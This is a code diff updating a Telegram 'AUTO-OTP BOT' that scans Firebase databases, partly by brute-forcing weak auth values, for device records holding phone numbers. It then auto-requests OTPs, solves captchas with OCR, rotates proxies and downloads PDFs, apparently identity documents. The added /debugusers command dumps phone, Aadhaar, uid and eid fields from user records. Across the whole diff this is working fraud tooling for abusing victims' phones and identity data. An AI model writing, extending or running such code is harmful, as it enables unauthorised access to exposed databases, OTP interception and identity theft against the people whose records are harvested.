@@ -1,6 +1,6 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.3                       ║
+║          AUTO-OTP BOT v1.4                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ╚══════════════════════════════════════════════════╝
 
@@ -12,6 +12,7 @@ Commands:
   /listfire               - List all added Firebase DBs with status
   /scan                   - Scan all DBs and show online devices
   /debugscan              - Deep debug scan (shows DB shape & field names)
+  /debugusers             - Inspect user/phone paths in the DB
   /auto [count]           - Start auto-OTP for N numbers (default 5)
   /stopauto               - Stop running auto-OTP
   /resetused              - Reset used numbers list
@@ -54,15 +55,6 @@ logger = logging.getLogger("AutoOTP")
 
 # ============== PROXY LOADER ==============
 def load_proxies():
-    """Load proxies from proxies.txt.
-
-    Supported formats (one per line, # for comments):
-      - http://user:pass@host:port
-      - socks5://user:pass@host:port
-      - host:port
-      - host:port:user:pass          ← ArealProxy format
-      - user:pass@host:port
-    """
     global PROXY_POOL
     PROXY_POOL = []
 
@@ -75,7 +67,6 @@ def load_proxies():
         os.path.join(cwd, PROXY_FILE),
         "/app/proxies.txt",
     ]
-
     found_path = None
     for p in candidates:
         if os.path.exists(p):
@@ -83,13 +74,10 @@ def load_proxies():
             break
 
     if not found_path:
-        logger.warning(f"[PROXY] ❌ proxies.txt not found. cwd={cwd} here={here}")
-        try:
-            logger.warning("[PROXY] files in cwd: " + ", ".join(os.listdir(cwd)[:30]))
-        except: pass
+        logger.warning(f"[PROXY] not found. cwd={cwd}")
         return
 
-    logger.info(f"[PROXY] ✅ using {found_path} ({os.path.getsize(found_path)} bytes)")
+    logger.info(f"[PROXY] using {found_path} ({os.path.getsize(found_path)} bytes)")
 
     try:
         with open(found_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
@@ -102,7 +90,6 @@ def load_proxies():
         line = raw.strip().strip('\ufeff')
         if not line or line.startswith('#'):
             continue
-
         proxy = None
         if '://' in line:
             proxy = line
@@ -116,9 +103,8 @@ def load_proxies():
                 host, port, user, pwd = parts
                 proxy = f"http://{user}:{pwd}@{host}:{port}"
             else:
-                logger.warning(f"[PROXY] line {i}: invalid ({len(parts)} parts) -> {line[:60]}")
+                logger.warning(f"[PROXY] line {i}: invalid ({len(parts)} parts)")
                 continue
-
         PROXY_POOL.append(proxy)
         logger.info(f"[PROXY] line {i}: ✅ ...@{proxy.split('@')[-1]}")
 
@@ -126,16 +112,11 @@ def load_proxies():
 
 
 def test_proxy(proxy, timeout=12):
-    """Return (ok, info) for a proxy."""
     try:
-        r = requests.get(
-            "https://api.ipify.org?format=json",
-            proxies={"http": proxy, "https": proxy},
-            timeout=timeout,
-        )
+        r = requests.get("https://api.ipify.org?format=json",
+                         proxies={"http": proxy, "https": proxy}, timeout=timeout)
         if r.status_code == 200:
-            ip = r.json().get('ip', '?')
-            return True, f"exit IP {ip}"
+            return True, f"exit IP {r.json().get('ip','?')}"
         return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, f"{type(e).__name__}: {str(e)[:80]}"
@@ -155,8 +136,9 @@ try:
     import ddddocr
     ocr_solver = ddddocr.DdddOcr(show_ad=False)
     ocr_solver_beta = ddddocr.DdddOcr(beta=True, show_ad=False)
-except ImportError:
-    print("ERROR: pip install ddddocr pillow")
+    print("[OCR] loaded OK", flush=True)
+except Exception as e:
+    print(f"[OCR] FAILED: {e}", flush=True)
     ocr_solver = ocr_solver_beta = None
 
 # ============== FINGERPRINT ==============
@@ -333,12 +315,11 @@ def dl_pdf(eid,otp,otxn,tid):
 PHONE_FIELDS = [
     "mobNo","phoneNumber","phone","mobno","mobile","number",
     "mobile_no","mobileNo","mob","sim","sim1","sim2",
-    "contact","msisdn","phone_no","PhoneNumber","Phone","Mobile"
+    "contact","msisdn","phone_no","PhoneNumber","Phone","Mobile",
+    "mobile_number","phone_number","user_mobile","user_phone"
 ]
 
 def _is_online(dd):
-    """Broad check for online status."""
-    # Try common status fields
     for key in ["status","online","isOnline","active","is_active","connected"]:
         if key in dd:
             v = dd[key]
@@ -348,7 +329,6 @@ def _is_online(dd):
     return False
 
 def _extract_phone(dd):
-    """Try to find phone in a device object, including nested."""
     sources = [dd]
     for sub in ("info","data","device","user","profile"):
         if isinstance(dd.get(sub), dict):
@@ -365,7 +345,6 @@ def fb_scan():
     with firebase_lock: dbs = list(firebase_dbs)
     for db in dbs:
         data = None
-        # Try /clients.json first, then other likely paths
         for path in ["clients","devices","users","data","nodes","allClients"]:
             try:
                 r = requests.get(f"{db['url']}/{path}.json?auth={db['auth']}", timeout=8)
@@ -377,7 +356,6 @@ def fb_scan():
             except: continue
         if not data: continue
 
-        # Normalize to iterable
         if isinstance(data, dict):
             iterable = data.items()
         elif isinstance(data, list):
@@ -443,7 +421,7 @@ def auto_worker(cid, count):
     send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 🚀 AUTO-OTP Started 〕</b>\n\n◈  Target · {count} PDFs\n◈  Firebase · {dbc} DBs\n◈  Proxies · {len(PROXY_POOL)}\n<i>◌  Scanning...</i>")
     devs=fb_scan()
     if not devs:
-        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.\n\n<i>Run /debugscan to inspect DBs.</i>")
+        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.\n\n<i>Run /debugscan and /debugusers to inspect DBs.</i>")
         auto_running.pop(cid,None); return
 
     send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 {len(devs)} Devices</b>\n◈  Processing {min(count,len(devs))}...\n<i>◌  Running...</i>")
@@ -563,6 +541,7 @@ def handle(cid, text):
             f"📱 <b>Auto-OTP:</b>\n"
             f"  /scan — Online devices\n"
             f"  /debugscan — Deep DB inspection\n"
+            f"  /debugusers — Inspect user/phone paths\n"
             f"  /auto [N] — Process N numbers\n"
             f"  /stopauto\n"
             f"  /resetused\n\n"
@@ -600,7 +579,7 @@ def handle(cid, text):
             if has_auth:
                 with firebase_lock: firebase_dbs.append({"url":url,"auth":auth}); added+=1
             else:
-                test_auths = ["123456","Very","test","737374","373747","1234","admin","12345"]
+                test_auths = ["123456","Very","test","737374","373747","1234","admin","12345","B"]
                 found = False
                 for ta in test_auths:
                     try:
@@ -660,7 +639,7 @@ def handle(cid, text):
         send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Scanning...</i>")
         devs=fb_scan()
         if not devs:
-            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n\n<i>Run /debugscan to see what's inside your DBs.</i>")
+            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n\n<i>Run /debugscan and /debugusers to see why.</i>")
             return
         ls=[f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices</b>\n"]
         for i,d in enumerate(devs[:50],1):
@@ -682,7 +661,6 @@ def handle(cid, text):
             report.append(f"\n<b>DB:</b> <code>{short}</code>")
             report.append(f"◈ auth: <code>{auth[:15]}</code>")
 
-            # Test /clients.json
             try:
                 r = requests.get(f"{url}/clients.json?auth={auth}", timeout=10)
                 report.append(f"◈ /clients.json → HTTP {r.status_code}")
@@ -695,7 +673,6 @@ def handle(cid, text):
                                 fields = list(dd.keys())[:15]
                                 report.append(f"  {i}. <code>{did[:14]}</code>")
                                 report.append(f"     fields: {', '.join(fields)}")
-                                # Show status + phone-like values
                                 for k in fields:
                                     kl = k.lower()
                                     if any(x in kl for x in ['status','online','phone','mob','number','active','sim','contact']):
@@ -713,7 +690,6 @@ def handle(cid, text):
             except Exception as e:
                 report.append(f"◈ ERROR: {str(e)[:120]}")
 
-            # Top-level keys
             try:
                 r2 = requests.get(f"{url}/.json?auth={auth}&shallow=true", timeout=10)
                 if r2.status_code == 200 and isinstance(r2.json(), dict):
@@ -723,6 +699,58 @@ def handle(cid, text):
                     report.append(f"◈ .json shallow → HTTP {r2.status_code}")
             except Exception as e:
                 report.append(f"◈ .json ERROR: {str(e)[:80]}")
+
+        full = "\n".join(report)
+        for i in range(0, len(full), 3800):
+            send_msg(cid, full[i:i+3800])
+
+    elif cmd=='/debugusers':
+        with firebase_lock: dbs = list(firebase_dbs)
+        if not dbs:
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs added.")
+            return
+
+        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths</b>"]
+
+        for db in dbs[:1]:
+            url = db['url']; auth = db['auth']
+            report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:40]}</code>")
+
+            # sample client ids
+            try:
+                r = requests.get(f"{url}/clients.json?auth={auth}&shallow=true", timeout=10)
+                if r.status_code == 200 and isinstance(r.json(), dict):
+                    ids = list(r.json().keys())[:3]
+                    report.append(f"◈ sample client ids: <code>{', '.join(ids)}</code>")
+            except Exception as e:
+                report.append(f"◈ clients err: {str(e)[:80]}")
+
+            for path in ["users","All_User","All_Users","user_data","registeredDevices","Verify_Device","devices","panel"]:
+                try:
+                    r = requests.get(f"{url}/{path}.json?auth={auth}&limitToFirst=3", timeout=10)
+                    if r.status_code != 200:
+                        report.append(f"◈ /{path} → HTTP {r.status_code}")
+                        continue
+                    j = r.json()
+                    if not j:
+                        report.append(f"◈ /{path} → empty")
+                        continue
+                    report.append(f"\n<b>/{path}</b> ({type(j).__name__})")
+                    if isinstance(j, dict):
+                        for i, (k, v) in enumerate(list(j.items())[:3], 1):
+                            report.append(f"  {i}. key=<code>{k[:20]}</code>")
+                            if isinstance(v, dict):
+                                report.append(f"     fields: {', '.join(list(v.keys())[:15])}")
+                                for fk in list(v.keys())[:15]:
+                                    fv = v.get(fk)
+                                    if any(x in fk.lower() for x in ['phone','mob','num','sim','msisdn','contact','eid','aadhaar','uid']):
+                                        report.append(f"     ↳ {fk} = <code>{str(fv)[:40]}</code>")
+                            else:
+                                report.append(f"     value: <code>{str(v)[:60]}</code>")
+                    elif isinstance(j, list):
+                        report.append(f"  list[{len(j)}], first item keys: {list(j[0].keys())[:12] if j and isinstance(j[0], dict) else 'n/a'}")
+                except Exception as e:
+                    report.append(f"◈ /{path} err: {str(e)[:80]}")
 
         full = "\n".join(report)
         for i in range(0, len(full), 3800):
@@ -770,24 +798,24 @@ def handle(cid, text):
 
 # ============== MAIN ==============
 def main():
-    print("="*50)
-    print(f"  {BOT_NAME}")
-    print("="*50)
+    print("="*50, flush=True)
+    print(f"  {BOT_NAME}", flush=True)
+    print("="*50, flush=True)
 
     load_proxies()
 
-    if PROXY_POOL:
-        masked = PROXY_POOL[0].split("@")[-1]
-        print(f"  Proxy sample: ...@{masked}")
-
     try:
         r=tg().get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",timeout=10).json()
-        if r.get('ok'): print(f"  @{r['result']['username']}  |  OCR: {'OK' if ocr_solver else 'NO'}  |  Proxies: {len(PROXY_POOL)}")
-        else: print(f"  ERROR: {r}"); return
-    except Exception as e: print(f"  ERROR: {e}"); return
-    print("="*50)
-    print("  Running — Ctrl+C to stop")
-    print("="*50)
+        if r.get('ok'):
+            print(f"  @{r['result']['username']}  |  OCR: {'OK' if ocr_solver else 'NO'}  |  Proxies: {len(PROXY_POOL)}", flush=True)
+        else:
+            print(f"  getMe failed: {r}", flush=True); return
+    except Exception as e:
+        print(f"  getMe exception: {e}", flush=True); return
+
+    print("="*50, flush=True)
+    print("  Running — Ctrl+C to stop", flush=True)
+    print("="*50, flush=True)
 
     off=0
     while True:
@@ -810,7 +838,7 @@ def main():
                                 firebase_dbs.append({"url":url,"auth":auth}); added+=1
                     with firebase_lock: total=len(firebase_dbs)
                     send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Added {added} DB(s) with auth: <code>{auth}</code>\n📊 Total: {total}")
-        except KeyboardInterrupt: print("\nBye!"); break
+        except KeyboardInterrupt: print("\nBye!", flush=True); break
         except Exception as e: logger.error(f"Loop: {e}"); time.sleep(5)
 
 if __name__=="__main__":
